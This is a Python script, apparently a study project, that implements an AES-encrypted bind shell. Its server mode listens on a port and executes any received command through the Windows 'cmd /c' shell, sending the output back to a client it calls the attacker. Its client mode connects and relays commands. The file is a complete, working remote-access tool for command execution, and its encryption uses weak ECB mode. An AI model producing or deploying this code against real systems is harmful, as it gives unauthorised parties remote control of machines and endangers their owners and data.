import socket,threading,subprocess,argparse
from Crypto.Cipher import AES
from Crypto.Random import  get_random_bytes
from Crypto.Util.Padding import pad ,unpad
#Ref https://www.geeksforgeeks.org/difference-between-bind-shell-and-reverse-shell/
#Ref https://pythontic.com/modules/socket/send

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

#Ref https://nitratine.net/blog/post/python-encryption-and-decryption-with-pycryptodome/
#Ref About padding :https://asecuritysite.com/symmetric/padding
class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext,AES.block_size)).hex() #! Pad the input data and then encrypt

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self): 
        return 'key -> {}'.format(self.key.hex())                       #! To diplay the key 

    
def encrypted_send(s,msg):
    s.send(cipher.encrypt(msg).encode('latin-1'))




def execute_cmd(cmd):
    try:
        output = subprocess.check_output('cmd /c {}'.format(cmd),stderr=subprocess.STDOUT)
    except:                #!cheacking whether we entered correct cmd command or not
        output = b"bad command"
    return output


def decode_and_strip(s):  #!Here s is the actual socket we meed to decode
    return s.decode("latin-1").strip()   


#!This is the thread which will handle new user connnections 
def shell_thread(s):                                               #!Server side(bind shell)
    encrypted_send(s, b"[---------connected!----------]")          #!We tell the new user that he connected
    try:
        while True:                                                #! And from infinite loop we are listing commands from the user
            encrypted_send(s, b"\r\nenter command>")  

            data = s.recv(MAX_BUFFER)
            if data:   
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)

                if not buffer or buffer == 'exit':  
                    s.close()
                    exit()                                      #!When a command is received we either exit from the infinte loop or excute the command
            
            print(">Excecuting command : '{}'".format(buffer)) #!server side
            encrypted_send(s, execute_cmd(buffer))             #!And we send the resuls back to the user
    except:
        s.close()
        exit()

def send_thread(s):                                     #!Client thread
    try:
        while True:                                     #!Infinite loop
            data = input() + "\n"                       #!User command line
            encrypted_send(s, data.encode('latin-1'))   #!Encode the inf
    except: 
        s.close()
        exit()

def recv_thread(s):                                                  #!Server side 
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode('latin-1')
                                                                    #!Decode the command and display at the server side
                print("\n"+ data,end=" " , flush=True)              #!The command typed will be displayed
    except:
        s.close()
        exit()


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0",DEFAULT_PORT))
    s.listen()
    print("[------starting bind shell-------")
    while True:
        client_socket, addr = s.accept()
        print("-----new user conn-------",(addr[0], addr[1]))
        threading.Thread(target=shell_thread,args=(client_socket,)).start() 

#!(addr[0], addr[1]) shows ip and port of attacker
#!Here we r starting a thread (may be first thread)
#!We can also type like t1 = threading.Thread(target=shell_thread,args=(client_socket,))
#!t1.start() to start thread


def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))
    print("[-----------------Connecting to bind shell--------------------]")

    threading.Thread(target=send_thread,args=(s,)).start()   #!Here thread 2 send data to server
    threading.Thread(target=recv_thread,args=(s,)).start()   #!Here thread 3 receive data from server


#Ref https://towardsdatascience.com/a-simple-guide-to-command-line-arguments-with-argparse-6824c30ab1c3
parser = argparse.ArgumentParser()                                                                 # !Create the parser
parser.add_argument("-l",'--listen',action="store_true",help="setup a bind shell",required=False)  # !Add an argument
parser.add_argument("-c","--connect",help="connect to a bind shell",required=False)                # !Add an argumenthelp,required are called parametrs
parser.add_argument("-k","--key", help="encryption key", type=str ,required=False)                 # !Add an argument

#!Even if u dont add action,help ,required it will only show --l and --listen
#!we are adding those parametrs to give more functionaly
 
args = parser.parse_args()        #!Parse the argument
if args.connect and not args.key: #!We are connecting like 127.0.0.1 0 -c -k and here if we r not specifing the -k key nd supply the key name
                                  #!Give me this error message
    parser.error("-c connect requires -k key")
if args.key:                      #!If -k entereeed do below
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)        #!As we enter ip address that is going in place of ip


